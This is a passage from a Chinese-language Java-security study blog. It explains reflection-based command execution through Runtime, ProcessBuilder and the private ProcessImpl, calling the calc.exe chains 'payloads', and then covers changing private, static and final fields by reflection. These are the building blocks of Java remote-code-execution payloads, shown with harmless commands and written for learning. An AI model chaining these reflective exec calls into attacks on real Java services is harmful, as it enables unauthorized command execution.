class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> getRuntimeMethod.invoke(clazz);<br>execMethod.invoke(runtime, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="getConstructor方法-构造函数"><a href="#getConstructor方法-构造函数" class="headerlink" title="getConstructor方法(构造函数)"></a>getConstructor方法(构造函数)</h3><p>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？</p><p>和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。</p><p>获取到构造函数后，我们使用 newInstance 来执行。 </p><p>比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start() 来执行命令：</p><p>ProcessBuilder有两个构造函数：</p><ul><li>public ProcessBuilder(List command) </li><li>public ProcessBuilder(String… command)</li></ul><p>下面用到了第一个形式的构造函数，所以在 getConstructor 的时候传入的是 List.class 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(<br>Arrays.asList(<span class="hljs-string">&quot;calc.exe&quot;</span>)));<br></code></pre></td></tr></table></figure><p>通过 getMethod(“start”) 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是 ProcessBuilder Object了。</p><h3 id="可变长参数-varargs"><a href="#可变长参数-varargs" class="headerlink" title="可变长参数 varargs"></a>可变长参数 varargs</h3><p>那么，如果我们要使用 public ProcessBuilder(String… command) 这个构造函数，需要怎样用反射执行呢？</p><p>这又涉及到Java里的可变长参数（varargs）了。正如其他语言一样，Java也支持可变长参数，就是当你定义函数的时候不确定参数数量的时候，可以使用 … 这样的语法来表示“这个函数的参数个数是可变的”。</p><p>对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价的（也就不能重载）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">(String[] names)</span> &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">(String...names)</span> &#123;&#125;<br>-----<br>String[] names = &#123;<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>&#125;;<br>hello(names);<br></code></pre></td></tr></table></figure><p>那么对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。</p><p>所以，我们将字符串数组的类 String[].class 传给 getConstructor ，获取 ProcessBuilder 的第二种构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getConstructor(String[].class)<br></code></pre></td></tr></table></figure><p>在调用 newInstance 的时候，因为这个函数本身接收的是一个可变长参数，我们传给 ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> <br><span class="hljs-title class_">String</span>[][]&#123;&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();<br></code></pre></td></tr></table></figure><p>完全反射编写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance(<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[][]&#123;&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;&#125;));<br></code></pre></td></tr></table></figure><h3 id="getDeclared-系列的反射"><a href="#getDeclared-系列的反射" class="headerlink" title="getDeclared 系列的反射"></a>getDeclared 系列的反射</h3><p>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</p><p>getDeclared 系列的反射，与普通的 getMethod 、 getConstructor 区别是：</p><ul><li>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 </li><li>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了</li></ul><p>getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法和 getConstructor 类似</p><p>eg. Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例化对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>m.setAccessible(<span class="hljs-literal">true</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>可见，这里使用了一个方法 setAccessible ，这个是必须的。我们在获取到一个私有方法后，必须用 setAccessible 修改它的作用域，否则仍然不能调用。</p><h2 id="Java-命令执行的三种方式"><a href="#Java-命令执行的三种方式" class="headerlink" title="Java 命令执行的三种方式"></a>Java 命令执行的三种方式</h2><h3 id="1-调用-Runtime-类进行命令执行"><a href="#1-调用-Runtime-类进行命令执行" class="headerlink" title="1. 调用 Runtime 类进行命令执行"></a>1. 调用 Runtime 类进行命令执行</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.CommandExec;  <br>  <br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;  <br><span class="hljs-keyword">import</span> java.io.InputStream;  <br>  <br><span class="hljs-comment">// 使用 Runtime 类进行命令执行  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeExec</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream();  <br> <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br> <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache))!=-<span class="hljs-number">1</span>)&#123;  <br>            byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br> &#125;  <br>        System.out.println(byteArrayOutputStream);  <br> &#125;  <br>&#125;<br><span class="hljs-comment">//�ʵ۵��»�\zhr_0</span><br></code></pre></td></tr></table></figure><ol><li>先调用 getRuntime() 返回一个 Runtime 对象，然后调用 Runtime 对象的 exec 的方法。</li><li>调用 Runtime 对象的 exec 的方法会返回 Process 对象，调用 Process 对象的 getInputStream() 方法。</li><li>调用 Process 对象的 getInputStream() 方法，此时，子进程已经执行了 whoami 命令作为子进程的输出，将这一段输出作为输入流传入 inputStream</li></ol><p>我们的第一行就是用来执行命令的，但是我们执行命令需要得到命令的结果，所以需要将结果存储到字节数组当中</p><p>这一段代码用来保存运行结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br><span class="hljs-comment">/** </span><br><span class="hljs-comment">* readLen用于存储每次读取输入流的长度</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br><span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache))!=-<span class="hljs-number">1</span>)&#123;  <br>    byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-ProcessBuilder"><a href="#2-ProcessBuilder" class="headerlink" title="2. ProcessBuilder"></a>2. ProcessBuilder</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.CommandExec;  <br>  <br>  <br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;  <br><span class="hljs-keyword">import</span> java.io.InputStream;  <br>  <br><span class="hljs-comment">// 使用 ProcessBuilder 进行命令执行操作  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessBuilderExec</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;ipconfig&quot;</span>).start().getInputStream();  <br> <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br> <span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache)) != -<span class="hljs-number">1</span>)&#123;  <br>            byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br> &#125;  <br>        System.out.println(byteArrayOutputStream);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-使用-ProcessImpl"><a href="#3-使用-ProcessImpl" class="headerlink" title="3. 使用 ProcessImpl"></a>3. 使用 ProcessImpl</h3><p><code>ProcessImpl</code> 是更为底层的实现，<code>Runtime</code> 和 <code>ProcessBuilder</code> 执行命令实际上也是调用了 <code>ProcessImpl</code> 这个类，对于 <code>ProcessImpl</code> 类我们不能直接调用，但是可以通过反射来间接调用 <code>ProcessImpl</code> 来达到执行命令的目的。</p><ul><li>因为 ProcessImpl 是私有的方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.CommandExec;  <br>  <br>  <br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;  <br><span class="hljs-keyword">import</span> java.io.InputStream;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// 使用 ProcessImpl 进行命令执行  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessImplExec</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        String[] cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;whoami&quot;</span>&#125;;  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;start&quot;</span>, String[].class, Map.class, String.class,  <br> ProcessBuilder.Redirect[].class, <span class="hljs-type">boolean</span>.class);  <br> method.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Process</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> (Process) method.invoke(<span class="hljs-literal">null</span>, cmds, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>);  <br> <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> e.getInputStream();  <br> <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br> <span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache)) != -<span class="hljs-number">1</span>)&#123;  <br>            byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br> &#125;  <br>        System.out.println(byteArrayOutputStream);  <br> &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Java-反射修改-static-final-修饰的字段"><a href="#Java-反射修改-static-final-修饰的字段" class="headerlink" title="Java 反射修改 static final 修饰的字段"></a>Java 反射修改 static final 修饰的字段</h2><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><p><strong>PrivatePerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrivatePerson</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;1&quot;</span>);  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printName</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>PrivateReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrivateReflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.PrivatePerson&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">PrintMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;printName&quot;</span>);<br>        PrintMethod.invoke(m);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(m, <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;111&quot;</span>));<br>        PrintMethod.invoke(m);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a03.png"></p><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p><strong>StaticPerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticPerson</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;1&quot;</span>);  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>StaticReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticReflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.StaticPerson&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">nameMethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);<br>        nameMethod.invoke(m);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(m,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;static&quot;</span>));<br>        nameMethod.invoke(m);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><p>final 字段能否修改，有且取决于字段是直接赋值还是间接赋值（编译时赋值和运行时赋值的区别）。<strong>直接赋值是指在创建字段时就对字段进行赋值，并且值为 JAVA 的 8 种基础数据类型或者 String 类型，而且值不能是经过逻辑判断产生的，其他情况均为间接赋值。</strong></p><h4 id="直接赋值-无法修改"><a href="#直接赋值-无法修改" class="headerlink" title="直接赋值(无法修改)"></a>直接赋值(无法修改)</h4><p><strong>FinalStraightPerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalStraightPerson</span> &#123;  <br>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1&quot;</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>-<span class="hljs-number">2</span>;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name+<span class="hljs-string">&quot; &quot;</span>+age);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>FinalStraightReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalStraightReflect</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.FinalStraightPerson&quot;</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();  <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">printMethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);  <br>        printMethod.invoke(m);  <br>  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">ageField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);  <br>        nameField.setAccessible(<span class="hljs-literal">true</span>);  <br>        ageField.setAccessible(<span class="hljs-literal">true</span>);  <br>        nameField.set(m,<span class="hljs-string">&quot;2&quot;</span>);  <br>        ageField.set(m,<span class="hljs-string">&quot;10&quot;</span>);  <br>  <br>        printMethod.invoke(m);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a04.png"></p><p>这个报错本质上不是 因为 <code>final</code>，而是类型不匹配。</p><ul><li><p>要修改的字段 <code>age</code> 类型是 <code>int</code>（<strong>基本类型</strong>）。</p></li><li><p>但是用反射 <code>set(m, &quot;10&quot;)</code> 传进去的是 <code>String</code>。</p></li><li><p>反射不做自动类型转换，所以直接报错。</p></li></ul><p>修改语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ageField.set(m, Integer.parseInt(<span class="hljs-string">&quot;10&quot;</span>));<br></code></pre></td></tr></table></figure><p>运行代码后看到name与age仍未被修改</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a05.png"></p><p><strong>JVM 对 final 字段的缓存（Unsafe &amp; 反射限制）</strong></p><ul><li>Java 的 <code>Field.setAccessible(true)</code> 虽然可以突破访问控制，但对 <code>final</code> 修饰的字段，JVM 可能会在对象创建后把值存到寄存器或内存缓存里。</li><li>这意味着即使你用反射修改了字段的底层内存，后续读取可能依旧从缓存里取旧值。</li><li>另外，<code>final</code> 字段在 JDK 1.8 里，反射修改<strong>默认是无效的</strong>（除非用 <code>Unsafe</code> 或 <code>Field.modifiers</code> 去掉 <code>final</code> 标志）。</li></ul><p>但是使用<code>Unsafe</code> 或 <code>Field.modifiers</code> 去掉 <code>final</code> 标志大概率也是不可行的</p><p><strong>JVM 可能已经把原值内联优化了</strong>，尤其是基本类型（<code>int</code>、<code>long</code> 等）和 <code>String</code> 常量——它们在编译期或类加载后就被当作不可变常量处理了。</p><p>在 JDK 8（你用的是 1.8.0_112）里，有几个关键点导致你看不到修改效果：</p><ol><li><strong>JIT 常量折叠（constant folding）</strong><ul><li><code>final</code> 基本类型字段一旦被初始化，JVM 在运行时会直接把它当常量用，调用时直接从寄存器&#x2F;常量池取，而不是重新读字段值。</li><li>所以即便你反射 set 成新值，后面的调用仍然用的是缓存的旧值。</li></ul></li><li><strong>缓存的 Field 值</strong><ul><li>某些情况下，JVM 会在第一次访问后把 final 字段的值缓存起来，后续不会再真正访问内存。</li></ul></li><li><strong>你的 <code>printInfo()</code> 可能直接使用了编译期内联值</strong><ul><li>如果 <code>printInfo()</code> 方法在同一个类里直接访问了 <code>final int age</code>，编译器在生成字节码时已经把值“写死”了。</li></ul></li></ol><h4 